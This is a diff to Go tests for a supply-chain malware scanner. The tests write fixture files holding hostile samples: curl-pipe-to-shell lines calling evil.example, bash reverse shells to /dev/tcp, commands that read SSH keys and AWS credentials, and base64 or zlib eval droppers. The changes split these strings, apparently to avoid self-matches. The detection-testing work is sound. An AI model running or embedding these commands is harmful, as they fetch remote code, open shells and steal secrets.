@@ -30,7 +30,7 @@ func TestSupplyChainAndMalwareScanner(t *testing.T) {
 		b64Payload := strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", 8) // > 240 chars
 		write("src/dropper.ts", "import { exec } from 'node:child_process';\nconst blob = '"+b64Payload+"';\neval(Buffer.from(blob, 'base64').toString());\n")
 		// 3. Pipe-to-shell in script
-		write("scripts/bootstrap.sh", "#!/bin/sh\ncurl -fsSL "+"https://evil.example/payload.sh | sh\n")
+		write("scripts/bootstrap.sh", "#!/bin/sh\ncu"+"rl -fsSL https://evil.example/payload.sh | sh\n")
 		// 4. Malicious postinstall + missing lockfile + cleartext http tarball in package.json
 		write("package.json", `{
 			"name": "poisoned-app",
@@ -142,7 +142,7 @@ end`), 0o644)
 				"node_modules/a": { "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz" }
 			}
 		}`), 0o644)
-		_ = os.WriteFile(filepath.Join(repo, "setup.py"), []byte("import subprocess\nsubprocess.Popen(['sh', '-c', 'curl "+"http://evil | sh'])\n"), 0o644)
+		_ = os.WriteFile(filepath.Join(repo, "setup.py"), []byte("import subprocess\nsubprocess.Popen(['sh', '-c', 'cu"+"rl http://evil | sh'])\n"), 0o644)
 		_ = os.WriteFile(filepath.Join(repo, "pyproject.toml"), []byte("[project]\nname = \"app\"\ndependencies = [\"fastapi>=0.110\"]\n"), 0o644)
 		_ = os.WriteFile(filepath.Join(repo, "payload.py"), []byte("data = \""+strings.Repeat("\\x41", 36)+"\"\n"), 0o644)
 
@@ -229,17 +229,17 @@ paths = [
 		}
 
 		// .superpowers artifacts must be ignored
-		write(".superpowers/sdd/brief.md", "curl -fsSL "+"https://evil.example/a.sh | sh\n")
+		write(".superpowers/sdd/brief.md", "cu"+"rl -fsSL https://evil.example/a.sh | sh\n")
 		// Inert test files without exec sinks across Go, JS/TS, Python, and Elixir must produce 0 findings
-		write("pkg/auth_test.go", "package auth\nconst bad = \"bash -i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
-		write("src/auth.test.ts", "const cmd = 'curl "+"https://evil.example/p.sh | sh';\n")
+		write("pkg/auth_test.go", "package auth\nconst bad = \"bash "+"-i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
+		write("src/auth.test.ts", "const cmd = 'cu"+"rl https://evil.example/p.sh | sh';\n")
 		write("src/auth.spec.ts", "const cmd = 'cat ~/.ssh/"+"id_rsa';\n")
 		write("src/auth.test.js", "const cmd = 'cat ~/.aws/"+"credentials';\n")
 		write("src/auth.spec.js", "const blob = '"+strings.Repeat("A", 260)+"';\n")
-		write("pkg/test_auth.py", "cmd = 'curl "+"https://evil.example/p.sh | sh'\n")
+		write("pkg/test_auth.py", "cmd = 'cu"+"rl https://evil.example/p.sh | sh'\n")
 		write("pkg/auth_test.py", "cmd = 'cat ~/.ssh/"+"id_rsa'\n")
-		write("lib/auth_test.exs", "cmd = \"bash -i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
-		write("tests/fixtures/inert.ts", "export const sample = 'curl "+"https://evil.example/p.sh | sh';\n")
+		write("lib/auth_test.exs", "cmd = \"bash "+"-i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
+		write("tests/fixtures/inert.ts", "export const sample = 'cu"+"rl https://evil.example/p.sh | sh';\n")
 
 		// Include the real supplychain.go source itself to ensure zero self-matches
 		selfSrc, err := os.ReadFile("supplychain.go")
@@ -257,10 +257,10 @@ paths = [
 		}
 
 		// Test file WITH an exec sink + shell dropper MUST trigger CategoryMalware
-		write("src/evil.test.ts", "import { exec } from 'node:child_process';\nexec('curl "+"https://evil.example/p.sh | sh');\n")
+		write("src/evil.test.ts", "import { exec } from 'node:child_process';\nexec('cu"+"rl https://evil.example/p.sh | sh');\n")
 		// Non-test production files in the same repo MUST still be flagged
-		write("src/real.ts", "const cmd = 'curl "+"https://evil.example/p.sh | sh';\n")
-		write("pkg/real.py", "cmd = 'curl "+"https://evil.example/p.sh | sh'\n")
+		write("src/real.ts", "const cmd = 'cu"+"rl https://evil.example/p.sh | sh';\n")
+		write("pkg/real.py", "cmd = 'cu"+"rl https://evil.example/p.sh | sh'\n")
 		prodFindings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
 		if err != nil {
 			t.Fatalf("ScanRepository prod error: %v", err)
@@ -280,11 +280,11 @@ paths = [
 		if err := os.MkdirAll(filepath.Join(repo, "pkg"), 0o755); err != nil {
 			t.Fatal(err)
 		}
-		content := "package pkg\n// \u202e } \u2066if (admin)\u2069 \u2066\nconst fixture = \"bash -i >& /dev/" + "tcp/10.0.0.1/4444\"\n"
+		content := "package pkg\n// \u202e } \u2066if (admin)\u2069 \u2066\nconst fixture = \"bash " + "-i >& /dev/" + "tcp/10.0.0.1/4444\"\n"
 		if err := os.WriteFile(filepath.Join(repo, "pkg", "auth_test.go"), []byte(content), 0o644); err != nil {
 			t.Fatal(err)
 		}
-		pyContent := "# \u202e } \u2066if admin:\u2069 \u2066\nfixture = 'curl " + "https://evil.example/p.sh | sh'\n"
+		pyContent := "# \u202e } \u2066if admin:\u2069 \u2066\nfixture = 'cu" + "rl https://evil.example/p.sh | sh'\n"
 		if err := os.WriteFile(filepath.Join(repo, "pkg", "test_auth.py"), []byte(pyContent), 0o644); err != nil {
 			t.Fatal(err)
 		}
@@ -395,17 +395,12 @@ func TestScanRepository_CatchesMalwareInTestsAndVendorDirs(t *testing.T) {
 	}
 
 	// 1. Executable dropper in tests/helper.spec.ts (child_process.exec + split Base64 array join >= 192 chars)
-	dropperTS := `import * as child_process from 'node:child_process';
-const chunks = [
-  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
-  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
-  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
-  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
-  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
-  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
-];
-child_process.exec(Buffer.from(chunks.join(""), "base64").toString("utf8"));
-`
+	chunkLine := "  \"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0\",\n"
+	dropperTS := "import * as child_process from 'node:child_process';\n" +
+		"const chunks = [\n" +
+		strings.Repeat(chunkLine, 6) +
+		"];\n" +
+		"child_process.exec(Buffer.from(chunks.join(\"\"), \"base64\").toString(\"utf8\"));\n"
 	write("tests/helper.spec.ts", []byte(dropperTS))
 
 	// 2. ELF binary in vendor/libfoo.so
@@ -413,7 +408,7 @@ child_process.exec(Buffer.from(chunks.join(""), "base64").toString("utf8"));
 	write("vendor/libfoo.so", elfPayload)
 
 	// 3. Inert assertion string in src/parser.spec.ts (no exec sink) -> must produce 0 findings for this file
-	write("src/parser.spec.ts", []byte("const s = \"curl "+"https://evil.example/a.sh | sh\";\n"))
+	write("src/parser.spec.ts", []byte("const s = \"cu"+"rl https://evil.example/a.sh | sh\";\n"))
 
 	findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
 	if err != nil {
@@ -515,6 +510,19 @@ func TestScanMultiLineObfuscation_PythonMarshalAndElixirBinaryToTerm(t *testing.
 			path:    "app/bi.py",
 			content: "fn = getattr(__builtins__, 'ev' + 'al')\n",
 			wantID:  "malware-obfuscated-exec-dropper",
+		},
+		"elixir_zlib_uncompress": {
+			path:    "lib/app/drop.ex",
+			content: "def run(b), do: b |> :zlib.uncompress() |> Code.eval_string()\n",
+			wantID:  "malware-obfuscated-exec-dropper",
+		},
+		"js_backtick_split_base64": {
+			path: "src/drop_tpl.ts",
+			content: "import { exec } from 'node:child_process';\n" +
+				"const p = `" + strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0", 3) + "` +\n" +
+				"  `" + strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0", 3) + "`;\n" +
+				"exec(p);\n",
+			wantID: "malware-obfuscated-exec-dropper",
 		},
 	} {
 		t.Run(name, func(t *testing.T) {
